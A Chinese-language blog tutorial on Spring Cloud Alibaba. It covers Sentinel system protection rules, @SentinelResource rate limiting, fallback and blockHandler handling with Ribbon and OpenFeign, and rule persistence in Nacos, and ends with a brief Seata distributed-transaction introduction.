<h2 id="系统规则"><a href="#系统规则" class="headerlink" title="系统规则"></a>系统规则</h2><p><a href="https://github.com/alibaba/Sentinel/wiki/%E7%B3%BB%E7%BB%9F%E8%87%AA%E9%80%82%E5%BA%94%E9%99%90%E6%B5%81">https://github.com/alibaba/Sentinel/wiki/%E7%B3%BB%E7%BB%9F%E8%87%AA%E9%80%82%E5%BA%94%E9%99%90%E6%B5%81</a></p>
<p>系统保护规则是从应用级别的入口流量进行控制，从单台机器的 load、CPU 使用率、平均 RT、入口 QPS 和并发线程数等几个维度监控应用指标，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性。</p>
<p>系统保护规则是应用整体维度的，而不是资源维度的，并且<strong>仅对入口流量生效</strong>。入口流量指的是进入应用的流量（<code>EntryType.IN</code>），比如 Web 服务或 Dubbo 服务端接收的请求，都属于入口流量。</p>
<p>系统规则支持以下的模式：</p>
<ul>
<li><strong>Load 自适应</strong>（仅对 Linux/Unix-like 机器生效）：系统的 load1 作为启发指标，进行自适应系统保护。当系统 load1 超过设定的启发值，且系统当前的并发线程数超过估算的系统容量时才会触发系统保护（BBR 阶段）。系统容量由系统的 <code>maxQps * minRt</code> 估算得出。设定参考值一般是 <code>CPU cores * 2.5</code>。</li>
<li><strong>CPU usage</strong>（1.5.0+ 版本）：当系统 CPU 使用率超过阈值即触发系统保护（取值范围 0.0-1.0），比较灵敏。</li>
<li><strong>平均 RT</strong>：当单台机器上所有入口流量的平均 RT 达到阈值即触发系统保护，单位是毫秒。</li>
<li><strong>并发线程数</strong>：当单台机器上所有入口流量的并发线程数达到阈值即触发系统保护。</li>
<li><strong>入口 QPS</strong>：当单台机器上所有入口流量的 QPS 达到阈值即触发系统保护</li>
</ul>
<h2 id="SentinelResource"><a href="#SentinelResource" class="headerlink" title="@SentinelResource"></a>@SentinelResource</h2><h3 id="按资源名称限流"><a href="#按资源名称限流" class="headerlink" title="按资源名称限流"></a>按资源名称限流</h3><p><img src="https://csn.damyoung.cn/image-20210204203134381.png" alt="image-20210204203134381"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/byResource&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;byResource&quot;,blockHandler = &quot;handleException&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult <span class="title">byResource</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">&quot;按资源名称限流测试OK&quot;</span>,<span class="keyword">new</span> Payment(<span class="number">2020L</span>,<span class="string">&quot;serial001&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult <span class="title">handleException</span><span class="params">(BlockException exception)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">444</span>,exception.getClass().getCanonicalName()+<span class="string">&quot;\t 服务不可用&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204203901101.png" alt="image-20210204203901101"></p>
<p><img src="https://csn.damyoung.cn/image-20210204203919956.png" alt="image-20210204203919956"></p>
<p><img src="https://csn.damyoung.cn/image-20210204203928416.png" alt="image-20210204203928416"></p>
<h3 id="按Url限流"><a href="#按Url限流" class="headerlink" title="按Url限流"></a>按Url限流</h3><blockquote>
<p>加了斜杆/</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/rateLimit/byUrl&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;byUrl&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult <span class="title">byUrl</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">&quot;按url限流测试OK&quot;</span>,<span class="keyword">new</span> Payment(<span class="number">2020L</span>,<span class="string">&quot;serial002&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204204309347.png" alt="image-20210204204309347"></p>
<p><img src="https://csn.damyoung.cn/image-20210204204341751.png" alt="image-20210204204341751"></p>
<h3 id="自定义限流处理逻辑"><a href="#自定义限流处理逻辑" class="headerlink" title="自定义限流处理逻辑"></a>自定义限流处理逻辑</h3><p><img src="https://csn.damyoung.cn/image-20210204204459804.png" alt="image-20210204204459804"></p>
<p><img src="https://csn.damyoung.cn/image-20210204204512422.png" alt="image-20210204204512422"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/rateLimit/customerBlockHandler&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;customerBlockHandler&quot;,</span></span><br><span class="line"><span class="meta">        blockHandlerClass = CustomerBlockHandler.class,</span></span><br><span class="line"><span class="meta">        blockHandler = &quot;handlerException2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult <span class="title">customerBlockHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">&quot;按客戶自定义&quot;</span>,<span class="keyword">new</span> Payment(<span class="number">2020L</span>,<span class="string">&quot;serial003&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomerBlockHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CommonResult <span class="title">handlerException</span><span class="params">(BlockException exception)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">4444</span>,<span class="string">&quot;按客戶自定义,global handlerException----1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CommonResult <span class="title">handlerException2</span><span class="params">(BlockException exception)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">4444</span>,<span class="string">&quot;按客戶自定义,global handlerException----2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204205109766.png" alt="image-20210204205109766"></p>
<h3 id="更多注解属性"><a href="#更多注解属性" class="headerlink" title="更多注解属性"></a>更多注解属性</h3><p><a href="https://github.com/alibaba/Sentinel/wiki/%E6%B3%A8%E8%A7%A3%E6%94%AF%E6%8C%81">https://github.com/alibaba/Sentinel/wiki/%E6%B3%A8%E8%A7%A3%E6%94%AF%E6%8C%81</a></p>
<p><img src="https://csn.damyoung.cn/image-20210204205313122.png" alt="image-20210204205313122"></p>
<p><img src="https://csn.damyoung.cn/image-20210204205331443.png" alt="image-20210204205331443"></p>
<h2 id="服务熔断"><a href="#服务熔断" class="headerlink" title="服务熔断"></a>服务熔断</h2><blockquote>
<p>sentinel整合ribbon+openFeign+fallback</p>
</blockquote>
<h3 id="Ribbon系列"><a href="#Ribbon系列" class="headerlink" title="Ribbon系列"></a>Ribbon系列</h3><p><img src="https://csn.damyoung.cn/image-20210204205513896.png" alt="image-20210204205513896"></p>
<h4 id="9003"><a href="#9003" class="headerlink" title="9003"></a>9003</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--SpringCloud ailibaba nacos --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span><span class="comment">&lt;!-- 引入自己定义的api通用包，可以使用Payment支付Entity --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9003</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-payment-provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#配置Nacos地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentMain9003</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(PaymentMain9003.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Long, Payment&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        hashMap.put(<span class="number">1L</span>,<span class="keyword">new</span> Payment(<span class="number">1L</span>,<span class="string">&quot;28a8c1e3bc2742d8848569891fb42181&quot;</span>));</span><br><span class="line">        hashMap.put(<span class="number">2L</span>,<span class="keyword">new</span> Payment(<span class="number">2L</span>,<span class="string">&quot;bba8c1e3bc2742d8848569891ac32182&quot;</span>));</span><br><span class="line">        hashMap.put(<span class="number">3L</span>,<span class="keyword">new</span> Payment(<span class="number">3L</span>,<span class="string">&quot;6ua8c1e3bc2742d8848569891xt92183&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/paymentSQL/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Payment payment = hashMap.get(id);</span><br><span class="line">        CommonResult&lt;Payment&gt; result = <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">&quot;from mysql,serverPort:  &quot;</span>+serverPort,payment);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="84"><a href="#84" class="headerlink" title="84"></a>84</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--SpringCloud ailibaba nacos --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--SpringCloud ailibaba sentinel --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">84</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-order-consumer</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="comment">#配置Sentinel dashboard地址</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span></span><br><span class="line">        <span class="comment">#默认8719端口，假如被占用会自动从8719开始依次+1扫描,直至找到未被占用的端口</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNacosMain84</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderNacosMain84.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CircleBreakerController84"><a href="#CircleBreakerController84" class="headerlink" title="CircleBreakerController84"></a>CircleBreakerController84</h4><h5 id="没有配置"><a href="#没有配置" class="headerlink" title="没有配置"></a>没有配置</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/consumer/fallback/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;fallback&quot;)</span> <span class="comment">//没有配置</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">fallback</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    CommonResult&lt;Payment&gt; result = restTemplate.getForObject(SERVICE_URL + <span class="string">&quot;/paymentSQL/&quot;</span>+id,CommonResult.class,id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException (<span class="string">&quot;IllegalArgumentException,非法参数异常....&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (result.getData() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException (<span class="string">&quot;NullPointerException,该ID没有对应记录,空指针异常&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fallback管运行异常，blockHandler管配置违规</p>
<p><img src="https://csn.damyoung.cn/image-20210204211652125.png" alt="image-20210204211652125"></p>
<p>没有配置，直接返回error页面</p>
<p><img src="https://csn.damyoung.cn/image-20210204211918969.png" alt="image-20210204211918969"></p>
<h5 id="配置fallback"><a href="#配置fallback" class="headerlink" title="配置fallback"></a>配置fallback</h5><blockquote>
<p>只处理运行异常，不管配置违规</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SentinelResource(value = &quot;fallback&quot;,fallback = &quot;handlerFallback&quot;)</span> <span class="comment">//fallback只负责业务异常</span></span><br></pre></td></tr></table></figure>

<p>兜底方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//本例是fallback</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult <span class="title">handlerFallback</span><span class="params">(<span class="meta">@PathVariable</span>  Long id,Throwable e)</span> </span>&#123;</span><br><span class="line">    Payment payment = <span class="keyword">new</span> Payment(id,<span class="string">&quot;null&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">444</span>,<span class="string">&quot;兜底异常handlerFallback,exception内容  &quot;</span>+e.getMessage(),payment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204212201371.png" alt="image-20210204212201371"></p>
<h5 id="只配置blockHandler"><a href="#只配置blockHandler" class="headerlink" title="只配置blockHandler"></a>只配置blockHandler</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SentinelResource(value = &quot;fallback&quot;,blockHandler = &quot;blockHandler&quot;)</span> <span class="comment">//blockHandler只负责sentinel控制台配置违规</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204213012372.png" alt="image-20210204213012372"></p>
<p>点俩次</p>
<p><img src="https://csn.damyoung.cn/image-20210204213032795.png" alt="image-20210204213032795"></p>
<h5 id="俩种都配置"><a href="#俩种都配置" class="headerlink" title="俩种都配置"></a>俩种都配置</h5><p><img src="https://csn.damyoung.cn/image-20210204213126954.png" alt="image-20210204213126954"></p>
<h5 id="异常忽略"><a href="#异常忽略" class="headerlink" title="异常忽略"></a>异常忽略</h5><blockquote>
<p>运行异常会被抛出(配置<code>IllegalArgumentException</code>出现会出现error页面而不进入兜底方法)</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210204213259723.png" alt="image-20210204213259723"></p>
<h3 id="Feign系列"><a href="#Feign系列" class="headerlink" title="Feign系列"></a>Feign系列</h3><p><img src="https://csn.damyoung.cn/image-20210204213718955.png" alt="image-20210204213718955"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud openfeign --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#消费者将要去访问的微服务名称(注册成功进nacos的微服务提供者)</span></span><br><span class="line"><span class="attr">service-url:</span></span><br><span class="line">  <span class="attr">nacos-user-service:</span> <span class="string">http://nacos-payment-provider</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活Sentinel对Feign的支持</span></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNacosMain84</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderNacosMain84.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;nacos-payment-provider&quot;,fallback = PaymentFallbackService.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PaymentService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/paymentSQL/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function">CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentFallbackService</span> <span class="keyword">implements</span> <span class="title">PaymentService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult&lt;&gt;(<span class="number">444</span>,<span class="string">&quot;服务降级返回&quot;</span>,<span class="keyword">new</span> Payment(id,<span class="string">&quot;errorSerial&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//==================OpenFeign</span></span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> PaymentService paymentService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(value = &quot;/consumer/paymentSQL/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">paymentSQL</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> paymentService.paymentSQL(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204214622324.png" alt="image-20210204214622324"></p>
<p>测试84调用9003，此时故意关闭9003微服务提供者</p>
<p><img src="https://csn.damyoung.cn/image-20210204214742428.png" alt="image-20210204214742428"></p>
<h2 id="规则持久化"><a href="#规则持久化" class="headerlink" title="规则持久化"></a>规则持久化</h2><p>一旦我们重启应用，sentinel规则将消失，生产环境需要将配置规则进行持久化</p>
<p>将限流配置规则持久化进Nacos保存，只要刷新840某个rest地址，sentinel控制台的流控规则就能看到，只要Nacos里面的配置不删除，针对8401上sentinel的流控规则持续有效</p>
<p>cloudalibaba-sentinel-service8401为例，重启配置会再刷新！！</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        springcloud alibaba sentinel 后续持久化--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#        添加nacos数据源配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">	<span class="attr">cloud:</span></span><br><span class="line">		<span class="attr">sentinel:</span>	</span><br><span class="line">			<span class="attr">datasource:</span></span><br><span class="line">        		<span class="attr">ds1:</span></span><br><span class="line">          			<span class="attr">nacos:</span></span><br><span class="line">            			<span class="attr">serverAddr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span></span><br><span class="line">            			<span class="attr">dataId:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br><span class="line">            			<span class="attr">groupId:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">            			<span class="attr">dataType:</span> <span class="string">json</span></span><br><span class="line">            			<span class="attr">ruleType:</span> <span class="string">FLOW</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204220703573.png" alt="image-20210204220703573"></p>
<p><img src="https://csn.damyoung.cn/image-20210204220716944.png" alt="image-20210204220716944"></p>
<p><img src="https://csn.damyoung.cn/image-20210204221035935.png" alt="image-20210204221035935"></p>
<p>测试</p>
<p><img src="https://csn.damyoung.cn/image-20210204221110662.png" alt="image-20210204221110662"></p>
<p>停止8401</p>
<p><img src="https://csn.damyoung.cn/image-20210204221136932.png" alt="image-20210204221136932"></p>
<p>重启8401</p>
<p><img src="https://csn.damyoung.cn/image-20210204221209168.png" alt="image-20210204221209168"></p>
<h1 id="Seate处理分布式事务"><a href="#Seate处理分布式事务" class="headerlink" title="Seate处理分布式事务"></a>Seate处理分布式事务</h1><h2 id="分布式问题"><a href="#分布式问题" class="headerlink" title="分布式问题"></a>分布式问题</h2><blockquote>
<p>一次业务操作需要跨多个数据源或需要跨多个系统进行远程调用，就会产生分布式事务问题</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210204221711342.png" alt="image-20210204221711342"></p>
<p><img src="https://csn.damyoung.cn/image-20210204221635201.png" alt="image-20210204221635201"></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>seata是一款开源的分布式事务解决方案，致力于在微服务架构下提供高性能和简单易用的分布式事务服务</p>
<p>我们只需要使用一个注解<code>@GlobalTransactional</code>注解解决分布式事务问题！！！！</p>
<p>官网<a href="http://seata.io/zh-cn">http://seata.io/zh-cn</a></p>
<p>下载<a href="https://github.com/seata/seata/releases">https://github.com/seata/seata/releases</a></p>
<h3 id="Transaction-ID"><a href="#Transaction-ID" class="headerlink" title="Transaction ID"></a>Transaction ID</h3><p>全局事务ID</p>
<h3 id="三组件"><a href="#三组件" class="headerlink" title="三组件"></a>三组件</h3><p>TC (Transaction Coordinator) - 事务协调者：维护全局和分支事务的状态，驱动全局事务提交或回滚。</p>
